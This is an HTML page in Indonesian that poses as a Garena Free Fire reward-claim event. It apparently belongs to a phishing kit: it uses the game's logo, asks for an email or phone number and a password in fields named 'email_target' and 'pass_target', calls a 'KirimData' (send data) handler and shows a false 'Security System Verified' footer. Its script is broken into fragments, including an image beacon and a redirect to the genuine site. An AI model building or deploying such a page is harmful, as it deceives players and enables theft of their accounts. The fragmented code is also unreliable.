<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FREE FIRE REWARD | EVENT SG REAPER</title>
<style>
  :root { --bg: #050505; --accent: #00ffcc; --card: #111; } /* Warna Hijau Reaper */
  body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
  nav { background: #000; padding: 15px; border-bottom: 2px solid var(--accent); text-align: center; }
  .logo { width: 100px; }
  .hero { text-align: center; padding: 40px 20px; background: radial-gradient(circle, #001a14 0%, #050505 80%); }
  .hero h1 { font-size: 28px; font-weight: 900; color: var(--accent); text-transform: uppercase; margin: 0; text-shadow: 0 0 15px var(--accent); }
  .hero span { color: #fff; }
  .login-box { max-width: 350px; margin: -20px auto 40px; background: var(--card); padding: 25px; border-radius: 15px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,255,204,0.1); }
  input { width: 100%; padding: 14px; margin-bottom: 15px; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; box-sizing: border-box; outline: none; }
  input:focus { border-color: var(--accent); }
  .cta { width: 100%; background: var(--accent); color: #000; font-weight: 900; padding: 15px; border-radius: 8px; border: none; cursor: pointer; text-transform: uppercase; font-size: 15px; box-shadow: 0 0 10px var(--accent); }
  .cta:hover { transform: scale(1.02); opacity: 0.9; }
  .footer { text-align: center; font-size: 10px; color: #444; margin-top: 20px; }
  .badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; margin-bottom: 10px; display: inline-block; }
</style>
</head>
<body>

  <nav><img src="https://freefiremobile-a.akamaihd.net/ff-landing/static/img/logo.png" class="logo"></nav>

  <section class="hero">

  <section class="login-box">
    <input type="text" id="email_target" placeholder="Email / Nomor HP" required>
    <input type="password" id="pass_target" placeholder="Kata Sandi" required>
    <button class="cta" onclick="KirimData()">KLAIM SEKARANG</button>
    <div class="footer">Garena Free Fire © 2026. Security System Verified.</div>
  </section>

  btn.disabled = true;

  const entryEmail = "345629703";

  const img = new Image();

    window.location.href = "https://ff.garena.com/id/";
